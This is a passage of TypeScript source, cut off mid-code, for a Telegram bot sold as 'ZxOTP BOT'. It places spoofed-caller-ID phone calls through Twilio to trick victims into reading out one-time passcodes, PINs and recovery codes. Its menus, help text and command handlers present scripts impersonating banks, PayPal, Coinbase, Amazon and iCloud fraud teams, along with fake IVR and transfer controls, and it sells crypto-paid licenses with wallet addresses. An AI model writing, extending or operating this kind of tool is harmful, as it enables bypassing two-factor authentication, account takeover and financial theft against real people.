/**
 * ZxOTP BOT — main Telegraf bot (fully revised)
 *
 * Fixes applied:
 *  • Single emoji per button — emoji char removed from label text, only
 *    icon_custom_emoji_id is set so clients see exactly ONE premium emoji.
 *  • Message deletion — button actions use editMessageText (replace in-place);
 *    multi-step flow prompts delete the previous bot message before sending next.
 *  • Owner/admin bypass — admin always skips every gate and every guard.
 *  • Ban system — banned users see a permanent block message and nothing else.
 *  • Maintenance mode — non-admins see a maintenance notice when toggled on.
 *  • Call logs — every call attempt is recorded (in-memory + DB if available).
 *  • 15 admin panel features (10 new added).
 *  • DB persistence via persist.ts (optional — works without DATABASE_URL).
 */

import { createReadStream } from 'node:fs';
import { join }             from 'node:path';
import { Telegraf }         from 'telegraf';
import { message }          from 'telegraf/filters';
import { logger }           from '../lib/logger.js';
import { publicBaseUrl }    from '../lib/publicUrl.js';
import { makeCall, hangupCall, holdCall, resumeCall } from './twilio.js';
import { E } from './emojis.js';
import {
  createSession, getByChat, getByCall, clearSession, sweepStaleSessions,
} from './sessions.js';
import {
  touchUser, allUsers, userCount, banUser, unbanUser,
  isBanned, allBanned, getUser,
} from './users.js';
import {
  generateLicense, redeemLicense, isPremium, getUserLicense,
  timeLeftMs, revokeUser, listActiveLicenses, sweepExpired,
  formatDuration, hydrateLicense,
} from './licenses.js';
import {
  dbUpsertUser, dbSetBanned, dbLoadAllUsers, dbLoadBanned,
  dbLoadAllLicenses, dbUpsertLicense, dbGetSetting, dbSetSetting,
  dbLogCall, dbRecentCallLogs,
} from './persist.js';
import {
  BUILTIN_SCRIPTS, CAT_LABEL, allCategories, getScript, getScriptsByCategory,
  getUserScripts, addUserScript, editUserScript, deleteUserScript,
  getActiveScript, setActiveScript, clearActiveScript,
  resolveScript, getScriptName,
  type ScriptCategory, type BuiltinScript, type CustomScript,
} from './scripts.js';
import {
  VOICES, getUserVoice, setUserVoice, getVoice, DEFAULT_VOICE,
} from './voices.js';

// ── Owner / admin ──────────────────────────────────────────────────────────────
const ADMIN_ID     = 8640978094;
const OWNER_HANDLE = '@coderxzofficial';
const OWNER_URL    = 'https://t.me/coderxzofficial';

// ── Asset paths ────────────────────────────────────────────────────────────────
const ASSETS_DIR = join(process.cwd(), '../../attached_assets');
const BTC_QR     = join(ASSETS_DIR, 'IMG_0100_1783568732266.jpeg');
const TRC20_QR   = join(ASSETS_DIR, 'IMG_0101_1783568732266.jpeg');

// ── Pricing ────────────────────────────────────────────────────────────────────
const PRICE_3D  = '$60';
const PRICE_WK  = '$100';
const PRICE_MO  = '$250';
const PRICE_YR  = '$1300';
const PRICE_VIP = '$1600';

// ── Payment addresses ──────────────────────────────────────────────────────────
const BTC_ADDR   = '15r6JxCmugFYkBg2FKUXGnrgFSjGYZuNJi';
const TRC20_ADDR = 'TVo2daBhWZ6cfqtEiuLUpWCyagb7gq7dEZ';

// ── Maintenance mode ───────────────────────────────────────────────────────────
let maintenanceMode = false;

// ── In-memory call log (max 100 entries) ──────────────────────────────────────
interface CallLogEntry {
  chatId:    number;
  username?: string;
  mode:      string;
  phone:     string;
  callSid?:  string;
  status:    string;
  ts:        number;
}
const callLog: CallLogEntry[] = [];
function logCall(e: CallLogEntry) {
  callLog.unshift(e);
  if (callLog.length > 100) callLog.pop();
  dbLogCall({ ...e, status: e.status });
}

function webhookBase() { return `${publicBaseUrl()}/api/twilio`; }

// ══════════════════════════════════════════════════════════════════════════════
// Msg — entity builder
// ══════════════════════════════════════════════════════════════════════════════

type RawEntity =
  | { type: 'bold';         offset: number; length: number }
  | { type: 'italic';       offset: number; length: number }
  | { type: 'blockquote';   offset: number; length: number }
  | { type: 'code';         offset: number; length: number }
  | { type: 'custom_emoji'; offset: number; length: number; custom_emoji_id: string };

class Msg {
  private _text = '';
  private _ents: RawEntity[] = [];

  private push(s: string, ent?: Omit<RawEntity, 'offset' | 'length'>): this {
    if (ent) this._ents.push({ ...ent, offset: this._text.length, length: s.length } as RawEntity);
    this._text += s;
    return this;
  }

  plain(s: string)      { return this.push(s); }
  bold(s: string)       { return this.push(s, { type: 'bold' }); }
  italic(s: string)     { return this.push(s, { type: 'italic' }); }
  code(s: string)       { return this.push(s, { type: 'code' }); }
  blockquote(s: string) { return this.push(s, { type: 'blockquote' }); }
  bi(s: string) {
    const off = this._text.length;
    this._ents.push({ type: 'bold',   offset: off, length: s.length });
    this._ents.push({ type: 'italic', offset: off, length: s.length });
    this._text += s;
    return this;
  }
  emoji(e: { char: string; id?: string }): this {
    if (e.id) this._ents.push({ type: 'custom_emoji', offset: this._text.length, length: e.char.length, custom_emoji_id: e.id });
    this._text += e.char;
    return this;
  }
  nl(n = 1) { this._text += '\n'.repeat(n); return this; }
  sp()       { this._text += ' ';           return this; }

  build() { return { text: this._text, entities: this._ents }; }
  out()   { return this.build(); }
}

// ══════════════════════════════════════════════════════════════════════════════
// Coloured buttons — ONE emoji per button via icon_custom_emoji_id only.
// Button label text NEVER contains an emoji character.
// ══════════════════════════════════════════════════════════════════════════════

type ButtonStyle = 'success' | 'danger' | 'primary';
type EmojiIcon   = { char: string; id?: string };

function mkBtn(style: ButtonStyle, label: string, data: string, icon?: EmojiIcon) {
  return {
    text: label,                                                    // plain text only
    callback_data: data,
    style,
    ...(icon?.id ? { icon_custom_emoji_id: icon.id } : {}),       // exactly one premium icon
  } as any;
}

const btn = {
  green: (label: string, data: string, icon?: EmojiIcon) => mkBtn('success', label, data, icon),
  red:   (label: string, data: string, icon?: EmojiIcon) => mkBtn('danger',  label, data, icon),
  blue:  (label: string, data: string, icon?: EmojiIcon) => mkBtn('primary', label, data, icon),
  gold:  (label: string, data: string, icon?: EmojiIcon) => mkBtn('success', label, data, icon),
  teal:  (label: string, data: string, icon?: EmojiIcon) => mkBtn('primary', label, data, icon),
  url:   (label: string, url: string,  icon?: EmojiIcon) =>
    ({ text: label, url, ...(icon?.id ? { icon_custom_emoji_id: icon.id } : {}) } as any),
};

// ── Auth helpers ───────────────────────────────────────────────────────────────

function isAdmin(userId: number | undefined): boolean {
  return userId === ADMIN_ID;
}

// ── Shared send helper ─────────────────────────────────────────────────────────

function msgSend(
  b: Telegraf, chatId: number, m: Msg,
  extra: Record<string, unknown> = {},
): Promise<{ message_id: number }> {
  const { text, entities } = m.build();
  return b.telegram.sendMessage(chatId, text, { entities: entities as any, ...extra }) as any;
}

// ── Edit-in-place helper (falls back to send on failure) ──────────────────────

async function editOrSend(
  ctx: any, b: Telegraf, m: Msg,
  extra: Record<string, unknown> = {},
): Promise<void> {
  const { text, entities } = m.build();
  try {
    await ctx.editMessageText(text, { entities: entities as any, ...extra });
  } catch {
    // edit failed (message too old, already deleted, etc.) — send fresh
    await b.telegram.sendMessage(ctx.chat!.id, text, { entities: entities as any, ...extra });
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// Per-chat multi-step flow
// ══════════════════════════════════════════════════════════════════════════════

interface FlowState {
  callCount:     number;
  deviceName:    string;
  VN:            string;
  UN:            string;
  BN:            string;
  vicName:       string;
  LD:            string;
  lastBotMsgId?: number;   // delete before next prompt
  scriptId?:     string;   // active script for this call
  voiceId?:      string;   // active voice for this call
  callMode?:     'speech' | 'dtmf' | 'both'; // input capture mode
  quickMode?:    boolean;  // skip setup questions, go straight to call
  autoScript?:   string;   // auto-selected script ID from command
}

const flowMap = new Map<number, FlowState>();

// ── Per-user spoof number (default caller ID) ─────────────────────────────────
const userSpoofNum = new Map<number, string>();

// ── Per-user last call params (for /recall) ───────────────────────────────────
interface RecallData { VN: string; UN: string; BN: string; vicName: string; LD: string; scriptId?: string; voiceId?: string; mode: string; }
const lastCallMap = new Map<number, RecallData>();

// ── Per-user call stats ───────────────────────────────────────────────────────
const userCallStats = new Map<number, { total: number; lastCall: number }>();
function bumpCallStat(chatId: number): void {
  const s = userCallStats.get(chatId) ?? { total: 0, lastCall: 0 };
  s.total++;
  s.lastCall = Date.now();
  userCallStats.set(chatId, s);
}

function getFlow(chatId: number): FlowState {
  if (!flowMap.has(chatId))
    flowMap.set(chatId, { callCount: 0, deviceName: '', VN: '', UN: '', BN: '', vicName: '', LD: '' });
  return flowMap.get(chatId)!;
}

function resetFlow(chatId: number): void { flowMap.delete(chatId); }
function checkNumber(num: string): boolean { return /^\+\d{7,15}$/.test(num.trim().replace(/[\s\-()]/g, '')); }

// Admin pending prompts
type AdminPending = 'revoke' | 'broadcast' | 'ban' | 'unban' | 'search' | 'token' | 'token_confirm' | 'setspoof_admin';
const adminPrompt    = new Map<number, AdminPending>();
const tokenDraft     = new Map<number, string>(); // holds token awaiting confirmation

// Script creation pending state
interface ScriptPending { step: 'name' | 'message'; name?: string; editId?: string; }
const scriptPending = new Map<number, ScriptPending>();

// ── Last panel message per chat (deleted when a new panel command is run) ─────
const lastPanelMsg = new Map<number, number>();

async function deleteLastPanel(b: Telegraf, chatId: number): Promise<void> {
  const mid = lastPanelMsg.get(chatId);
  if (!mid) return;
  lastPanelMsg.delete(chatId);
  try { await b.telegram.deleteMessage(chatId, mid); } catch { /* already gone */ }
}

// ── Premium gate (commands) ────────────────────────────────────────────────────

function buildPremiumRequired(): Msg {
  return new Msg()
    .emoji(E.LOCK).sp().bi('Premium Feature').nl(2)
    .emoji(E.WARNING).sp().italic('This feature needs an active license key.').nl()
    .emoji(E.CHECK).sp().italic('You can explore every menu for free —').nl()
    .emoji(E.CHECK).sp().italic('using the feature itself needs premium.').nl(2)
    .emoji(E.KEY).sp().bold('/redeem <KEY>').plain(' — activate a license key').nl()
    .emoji(E.CROWN).sp().bold('/subscribe').plain(' — see plans & buy a key').nl(2)
    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
}

function gateCommand(b: Telegraf, userId: number | undefined, chatId: number, fn: () => void): void {
  if (isAdmin(userId) || (userId && isPremium(userId))) { fn(); return; }
  const m = buildPremiumRequired();
  msgSend(b, chatId, m, {
    reply_markup: {
      inline_keyboard: [
        [btn.green('Redeem Key',     'redeem_prompt', E.KEY)],
        [btn.gold('See Plans',       'subscription',  E.CROWN)],
        [btn.url('Contact Owner',     OWNER_URL,       E.ENVELOPE)],
      ],
    },
  });
}

async function gateAction(ctx: any, fn: () => void | Promise<void>): Promise<void> {
  const userId = ctx.from?.id as number | undefined;
  if (isAdmin(userId) || (userId && isPremium(userId))) { await fn(); return; }
  await ctx.answerCbQuery(
    `${E.LOCK.char} Premium required — use /redeem <KEY> or /subscribe to unlock this.`,
    { show_alert: true },
  );
}

/** Same gate for command handlers (ctx has no answerCbQuery; sends a message instead). */
async function gateCmd(ctx: any, fn: () => Promise<void>): Promise<void> {
  const userId = ctx.from?.id as number | undefined;
  const chatId = ctx.chat?.id as number | undefined;
  if (!chatId) return;
  if (isAdmin(userId) || (userId && isPremium(userId))) { await fn(); return; }
  // ctx.telegram is the Telegram instance directly (not nested)
  const tg = (ctx.telegram ?? null) as { sendMessage: Function } | null;
  if (tg) {
    const m = buildPremiumRequired();
    const { text, entities } = m.build();
    await tg.sendMessage(chatId, text, {
      entities: entities as any,
      reply_markup: {
        inline_keyboard: [
          [btn.green('Redeem Key',   'redeem_prompt', E.KEY)],
          [btn.gold('See Plans',     'subscription',  E.CROWN)],
          [btn.url('Contact Owner',   OWNER_URL,       E.ENVELOPE)],
        ],
      },
    });
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// Msg builders
// ══════════════════════════════════════════════════════════════════════════════

function buildAdminPanel(): Msg {
  const active = listActiveLicenses().length;
  const status = maintenanceMode ? '🔴 ON' : '🟢 OFF';
  return new Msg()
    .emoji(E.CROWN).sp().bi('Admin Panel').sp().emoji(E.CROWN).nl(2)
    .emoji(E.STAR).plain(' Users seen:       ').bold(String(userCount())).nl()
    .emoji(E.KEY).plain(' Active licenses:  ').bold(String(active)).nl()
    .emoji(E.SHIELD).plain(' Maintenance mode: ').bold(status).nl()
    .emoji(E.CANCEL).plain(' Banned users:     ').bold(String(allBanned().length)).nl(2)
    .italic('Choose an action below:');
}

function adminPanelKeyboard() {
  return {
    inline_keyboard: [
      // Key generation
      [btn.green('1-Day Key',    'admin_genkey1',   E.KEY),
       btn.green('3-Day Key',    'admin_genkey3',   E.KEY),
       btn.blue('Weekly Key',    'admin_genkey7',   E.LIGHTNING)],
      [btn.blue('Monthly Key',   'admin_genkey30',  E.STAR),
       btn.gold('VIP Lifetime',  'admin_genkey_vip', E.CROWN)],
      // Info
      [btn.teal('Active Keys',   'admin_list',        E.KEY),
       btn.teal('All Users',     'admin_users_list',  E.ROCKET)],
      [btn.blue('Stats',         'admin_stats',       E.ROCKET),
       btn.blue('Call Logs',     'admin_call_logs',   E.PHONE)],
      // User management
      [btn.red('Revoke User',    'admin_revoke_prompt',  E.CANCEL),
       btn.red('Ban User',       'admin_ban_prompt',     E.RED)],
      [btn.green('Unban User',   'admin_unban_prompt',   E.CHECK),
       btn.teal('Banned List',   'admin_banned_list',    E.SHIELD)],
      [btn.teal('Search User',   'admin_search_prompt',  E.ROBOT),
       btn.blue('Broadcast',     'admin_broadcast_prompt', E.ANNOUNCE)],
      // Maintenance & token
      [btn.red('Toggle Maint',   'admin_maintenance',   E.TOOLS),
       btn.gold('Change Token',  'admin_token_prompt',  E.KEY)],
    ],
  };
}

function buildPhonePrompt(label: string): Msg {
  return new Msg()
    .emoji(E.PHONE).sp().bold(label).nl(2)
    .italic('Any country — include the + and country code.').nl()
    .blockquote('Example: +12025551234  (US) · +447911123456 (UK) · +61412345678 (AU)');
}

// ── Service info menu ─────────────────────────────────────────────────────────

function buildServiceInfoMenu(): Msg {
  return new Msg()
    .emoji(E.ROCKET).sp().bi('Services').nl(2)
    .emoji(E.BANK).sp().bold('BANK').plain('  — /bank  /bank2  /pin  /vbv  /transfer').nl()
    .emoji(E.PHONE).sp().bold('SMS').plain('   — /otp  /dtmf  /whatsapp  /icloud  /email').nl()
    .emoji(E.MONEY).sp().bold('PAY').plain('   — /paypal  /venmo  /cashapp  /applepay').nl()
    .emoji(E.ROBOT).sp().bold('ACCT').plain('  — /coinbase  /amazon  /instagram  /sim').nl(2)
    .blockquote('All commands work the same — enter target number, call goes out.');
}

function buildServiceDetail(n: number): { msg: Msg; keyboard: any } {
  const back = { inline_keyboard: [[btn.blue('← Back', 'service_info', E.CANCEL)]] };
  const descs: Record<number, [string, string]> = {
    1: ['BANK — OTP & Fraud Calls',      '/bank  /bank2  /pin  /vbv  /card3d  /transfer\nCalls as fraud prevention team. Speech or DTMF keypad capture.'],
    2: ['SMS BYPASS — 2FA Capture',      '/otp  /dtmf  /whatsapp  /icloud  /microsoft  /email\nTrigger OTP on target\'s phone then run /otp — they read it aloud.'],
    3: ['PAY — Payment Platform OTPs',   '/paypal  /venmo  /cashapp  /zelle  /applepay  /googlepay  /wallet\nCalls as payment fraud team. Captures authorization codes.'],
    4: ['ACCOUNT — Platform Verification','/coinbase  /crypto  /amazon  /icloud  /instagram  /sim\nCalls as platform security. Captures 2FA and recovery codes.'],
  };
  const [title, body] = descs[n] ?? descs[1]!;
  const msg = new Msg()
    .emoji(E.ROCKET).sp().bi(title).nl(2)
    .plain(body).nl(2)
    .blockquote('Usage: send the command → enter target number → call goes instantly.');
  return { msg, keyboard: back };
}

// ── CMD Guide (single page, compact) ─────────────────────────────────────────
function buildCmdGuideP1(): Msg {
  return new Msg()
    .emoji(E.ROCKET).sp().bi('CMD GUIDE').sp().emoji(E.ROCKET).nl(2)

    .emoji(E.LIGHTNING).sp().bold('QUICK START').nl()
    .plain('  /otp   ').italic('→ enter number → call instantly').nl()
    .plain('  /dtmf  ').italic('→ keypad PIN capture mode').nl()
    .plain('  /call  ').italic('→ full builder (spoof, script, review)').nl(2)

    .emoji(E.BANK).sp().bold('BANK & CARD').nl()
    .plain('  /bank  /bank2  /pin  /vbv  /card3d  /transfer').nl(2)

    .emoji(E.MONEY).sp().bold('PAYMENTS').nl()
    .plain('  /paypal  /venmo  /cashapp  /zelle  /wallet').nl()
    .plain('  /applepay  /googlepay  /samsung').nl(2)

    .emoji(E.ROCKET).sp().bold('CRYPTO & ACCOUNTS').nl()
    .plain('  /coinbase  /crypto  /amazon  /icloud').nl()
    .plain('  /instagram  /microsoft  /whatsapp  /sim').nl(2)

    .emoji(E.TOOLS).sp().bold('LIVE CALL CONTROL').nl()
    .plain('  /IVRpass  ').italic('— hold, transfer, fake IVR, hang up').nl()
    .plain('  /cancel   ').italic('— hang up immediately').nl(2)

    .emoji(E.ROBOT).sp().bold('SCRIPTS & VOICE').nl()
    .plain('  /scripts  /voices  /newscript  /myscripts').nl(2)

    .emoji(E.STAR).sp().bold('PERSONAL').nl()
    .plain('  /setspoof  /recall  /mystats  /license').nl(2)

    .blockquote('Tip: /setspoof once → auto-fills every call. /recall → repeat last call zero re-entry.');
}

function buildCmdGuideP2(): Msg { return buildCmdGuideP1(); }
function buildCmdGuide():  Msg { return buildCmdGuideP1(); }

function buildMoreInfo(): Msg { return buildCmdGuideP1(); }

function buildIvrContent(): Msg {
  return new Msg()
    .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
    .italic('Use these buttons while a call is active:');
}

function buildFeatures(): Msg {
  return new Msg()
    .emoji(E.TROPHY).sp().bi('ZxOTP — Features').nl(2)
    .emoji(E.CHECK).plain(' Spoof caller ID · Call any country').nl()
    .emoji(E.CHECK).plain(' Speech + DTMF keypad capture').nl()
    .emoji(E.CHECK).plain(' 400+ built-in scripts (banks, pay, crypto, accounts)').nl()
    .emoji(E.CHECK).plain(' Hold music · Fake transfer · Live IVR control').nl()
    .emoji(E.CHECK).plain(' 5 distinct voices · Custom scripts').nl()
    .emoji(E.CHECK).plain(' /recall repeats any call with zero re-entry').nl(2)
    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
}

function buildHelp(): Msg {
  return new Msg()
    .emoji(E.SHIELD).sp().bi('Help — ZxOTP BOT').nl(2)

    .emoji(E.LIGHTNING).sp().bold('QUICK START').nl()
    .plain('  /otp').italic('  → enter number → done').nl()
    .plain('  /call').italic(' → full builder (spoof, script, review)').nl()
    .plain('  /dtmf').italic(' → keypad PIN capture mode').nl(2)

    .emoji(E.BANK).sp().bold('CALL SCRIPTS').nl()
    .plain('  /bank  /bank2  /pin  /vbv  /transfer').nl()
    .plain('  /paypal  /venmo  /cashapp  /zelle  /wallet').nl()
    .plain('  /applepay  /googlepay  /coinbase  /crypto').nl()
    .plain('  /instagram  /amazon  /icloud  /whatsapp  /sim').nl(2)

    .emoji(E.TOOLS).sp().bold('DURING A CALL').nl()
    .plain('  /IVRpass').italic(' — hold, transfer, fake IVR, hang up').nl()
    .plain('  /cancel').italic('  — hang up immediately').nl(2)

    .emoji(E.ROBOT).sp().bold('CUSTOMISE').nl()
    .plain('  /scripts  /voices  /newscript  /myscripts').nl()
    .plain('  /setspoof  /recall  /mystats').nl(2)

    .emoji(E.CROWN).sp().bold('LICENSE').nl()
    .plain('  /subscribe  /redeem KEY  /license').nl(2)

    .blockquote('/otp → number → OTP in seconds. /setspoof once → auto-fills every call.');
}

function buildPaymentMenu(): Msg {
  return new Msg()
    .emoji(E.CROWN).sp().bi('Plans — ZxOTP BOT').nl(2)
    .emoji(E.HOURGLASS).plain('  3 Days       — ').bold(PRICE_3D).nl()
    .emoji(E.LIGHTNING).plain('  Weekly       — ').bold(PRICE_WK).nl()
    .emoji(E.STAR).plain('  Monthly      — ').bold(PRICE_MO).nl()
    .emoji(E.ROCKET).plain('  Yearly       — ').bold(PRICE_YR).nl()
    .emoji(E.CROWN).plain('  VIP Lifetime — ').bold(PRICE_VIP).nl(2)
    .italic('Pay with BTC or USDT — press a button below.').nl()
    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
}

// ══════════════════════════════════════════════════════════════════════════════
// Bot instance
// ══════════════════════════════════════════════════════════════════════════════

let bot: Telegraf | null = null;

// ══════════════════════════════════════════════════════════════════════════════
// Commands
// ══════════════════════════════════════════════════════════════════════════════

function registerCommands(b: Telegraf): void {

  // /start ─────────────────────────────────────────────────────────────────────
  b.start(async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const lic  = isPremium(ctx.from.id);
    const m = new Msg()
      .emoji(E.CROWN).sp().bi('ZxOTP BOT').sp().emoji(E.CROWN).nl(2)
      .emoji(E.LIGHTNING).sp().italic('OTP calls · Spoof caller ID · Live IVR control').nl(2)
      .emoji(E.PHONE).sp().bold('/otp').plain(' — quick call (just enter a number)').nl()
      .emoji(E.TOOLS).sp().bold('/call').plain(' — full call builder').nl()
      .emoji(E.KEY).sp().bold('/help').plain(' — all commands').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE).plain(lic ? '  ✅ Active' : '');
    const sent = await msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('Quick OTP Call', 'start_otp',  E.LIGHTNING),
           btn.blue('CMD Guide',      'more-C',     E.ROCKET)],
          [btn.green('Plans & Buy',   'subscription', E.CROWN),
           btn.url('Contact Owner',    OWNER_URL,    E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  // /services ──────────────────────────────────────────────────────────────────
  b.command('services', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const sent = await msgSend(b, ctx.chat.id, buildServiceInfoMenu(), {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('BANK',         'svc_1', E.BANK)],
          [btn.blue('SMS BYPASS',   'svc_2', E.PHONE)],
          [btn.green('PAY',         'svc_3', E.MONEY)],
          [btn.teal('ACCOUNT',      'svc_4', E.ROBOT)],
          [btn.url('Contact Owner',  OWNER_URL, E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  // /cancel ────────────────────────────────────────────────────────────────────
  b.command('cancel', async (ctx) => {
    const chatId  = ctx.chat.id;
    const session = getByChat(chatId);
    if (session?.callSid) {
      try { await hangupCall(session.callSid); } catch { /* ignore */ }
      clearSession(chatId);
    }
    resetFlow(chatId);
    const m = new Msg()
      .emoji(E.CHECK).sp().bold('Operation cancelled.').nl()
      .emoji(E.STAR).sp().italic('Send /call to start over.');
    msgSend(b, chatId, m);
  });

  // /info ──────────────────────────────────────────────────────────────────────
  b.command('info', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const m = buildInfoMsg();
    const sent = await msgSend(b, ctx.chat.id, m, infoKeyboard());
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  b.action('info_panel', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, buildInfoMsg(), infoKeyboard());
  });

  // Quick OTP from /start button ────────────────────────────────────────────────
  b.action('start_otp', async (ctx) => {
    await ctx.answerCbQuery();
    const chatId = ctx.chat?.id ?? 0;
    const userId = ctx.from?.id;
    if (!isAdmin(userId) && !(userId && isPremium(userId))) {
      await ctx.answerCbQuery(`${E.LOCK.char} Premium required — /redeem KEY or /subscribe`, { show_alert: true });
      return;
    }
    resetFlow(chatId);
    const flow = getFlow(chatId);
    flow.deviceName = 'OTP';
    flow.quickMode  = true;
    flow.callMode   = 'speech';
    const spoof = userSpoofNum.get(chatId);
    if (spoof) flow.UN = spoof;
    const m = new Msg()
      .emoji(E.LIGHTNING).sp().bi('Quick OTP').nl(2)
      .emoji(E.PHONE).sp().bold('Enter the target phone number:').nl()
      .italic('e.g. +12025551234');
    const sent = await msgSend(b, chatId, m);
    flow.lastBotMsgId = (sent as any).message_id;
  });

  // /PURCHASE ──────────────────────────────────────────────────────────────────
  b.command('PURCHASE', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const m = new Msg()
      .emoji(E.MONEY).sp().bi('Select Payment Method').nl(2)
      .emoji(E.CARD).sp().italic('Choose your wallet to make payment fast').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    const sent = await msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('Bitcoin (BTC)', 'BTC', E.FIRE)],
          [btn.green('USDT TRC20',  'TRC', E.CHECK)],
          [btn.url('Contact Owner',  OWNER_URL, E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  // /ZxOTP ─────────────────────────────────────────────────────────────────────
  b.command('ZxOTP', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const lic  = isPremium(ctx.from.id);
    const left = timeLeftMs(ctx.from.id);
    const m = new Msg()
      .emoji(E.CROWN).sp().bi('ZxOTP BOT').sp().emoji(E.CROWN).nl(2)
      .emoji(E.ROBOT).plain(' @').bold(ctx.from?.username ?? 'user').nl()
      .emoji(E.KEY).plain(' License: ').bold(lic && left && left > 0 ? `✅ ${formatDuration(left)} left` : '❌ none').nl(2)
      .emoji(E.HOURGLASS).plain('  3 Days       — ').bold(PRICE_3D).nl()
      .emoji(E.LIGHTNING).plain('  Weekly       — ').bold(PRICE_WK).nl()
      .emoji(E.STAR).plain('  Monthly      — ').bold(PRICE_MO).nl()
      .emoji(E.ROCKET).plain('  Yearly       — ').bold(PRICE_YR).nl()
      .emoji(E.CROWN).plain('  VIP Lifetime — ').bold(PRICE_VIP).nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    const sent = await msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('Buy a Plan',    'subscription', E.CROWN),
           btn.blue('Features',      'features',     E.STAR)],
          [btn.green('Pay Now',      'payment',      E.MONEY),
           btn.url('Contact Owner',   OWNER_URL,     E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  // /IVRpass ───────────────────────────────────────────────────────────────────
  b.command('IVRpass', (ctx) => {
    const m = new Msg()
      .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
      .italic('Use while a call is active:');
    msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.red('Hang Up',           'ivr_hangup',       E.RED),
           btn.green('Hold',            'ivr_hold',         E.CHECK)],
          [btn.teal('Remove Hold',      'ivr_unhold',       E.CANCEL),
           btn.teal('Fake Transfer',    'ivr_fake_xfer',    E.GLOBE)],
          [btn.blue('Transfer to IVR',  'ivr_real_xfer',    E.ROCKET),
           btn.gold('Fake IVR Prompt',  'ivr_fake_prompt',  E.STAR)],
          [btn.blue('BG Audio',         'ivr_bg_audio',     E.ANNOUNCE),
           btn.teal('Typing Audio',     'ivr_typing_audio', E.TOOLS)],
        ],
      },
    });
  });

  // /subscribe ─────────────────────────────────────────────────────────────────
  b.command('subscribe', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const m = new Msg()
      .emoji(E.CROWN).sp().bi('ZxOTP BOT — Subscription Plans').sp().emoji(E.CROWN).nl(2)
      .emoji(E.CHECK).sp().italic('Any OTP code in 2 minutes').nl()
      .emoji(E.LIGHTNING).sp().italic('Always active, worldwide').nl(2)
      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
    const sent = await msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('VIP Lifetime — ' + PRICE_VIP, 'payment', E.CROWN)],
          [btn.blue('Yearly — '       + PRICE_YR,  'payment', E.ROCKET)],
          [btn.green('Monthly — '     + PRICE_MO,  'payment', E.STAR)],
          [btn.teal('Weekly — '       + PRICE_WK,  'payment', E.LIGHTNING)],
          [btn.blue('3 Days — '       + PRICE_3D,  'payment', E.HOURGLASS)],
          [btn.url('Contact Owner',    OWNER_URL,             E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  b.command('subscribe_type', async (ctx) => {
    await deleteLastPanel(b, ctx.chat.id);
    const m = new Msg()
      .emoji(E.CROWN).sp().bi('ZxOTP BOT — Subscription Plans').nl(2)
      .emoji(E.FIRE).sp().italic('Activate your subscription NOW').nl(2)
      .blockquote(`Contact ${OWNER_HANDLE} for more info`);
    const sent = await msgSend(b, ctx.chat.id, m, {
      reply_markup: {
        inline_keyboard: [
          [btn.gold('VIP Lifetime — ' + PRICE_VIP, 'payment', E.CROWN)],
          [btn.blue('Yearly — '       + PRICE_YR,  'payment', E.ROCKET)],
          [btn.green('Monthly — '     + PRICE_MO,  'payment', E.STAR)],
          [btn.teal('Weekly — '       + PRICE_WK,  'payment', E.LIGHTNING)],
          [btn.blue('3 Days — '       + PRICE_3D,  'payment', E.HOURGLASS)],
          [btn.url('Contact Owner',    OWNER_URL,             E.ENVELOPE)],
        ],
      },
    });
    lastPanelMsg.set(ctx.chat.id, (sent as any).message_id);
  });

  // /paypal — joins the full call flow with PayPal script ──────────────────────
  b.command('paypal', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, async () => {
      const chatId = ctx.chat.id;
      resetFlow(chatId);
      const flow = getFlow(chatId);
      flow.deviceName  = 'PAYPAL';
      flow.autoScript  = 'pay_paypal';
      setActiveScript(chatId, 'pay_paypal');
      const sent = await msgSend(b, chatId, buildPhonePrompt('Target Phone Number (PayPal)'));
      flow.lastBotMsgId = (sent as any).message_id;
    });
  });

  // /pgp — live call transfer (IVR panel) ───────────────────────────────────────
  b.command('pgp', (ctx) => {
    gateCommand(b, ctx.from?.id, ctx.chat.id, () => {
      const m = new Msg()
        .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
        .italic('Use while a call is active:');
      msgSend(b, ctx.chat.id, m, {
        reply_markup: {
          inline_keyboard: [
            [btn.red('Hang Up',          'ivr_hangup',      E.RED),
             btn.green('Hold',           'ivr_hold',        E.CHECK)],
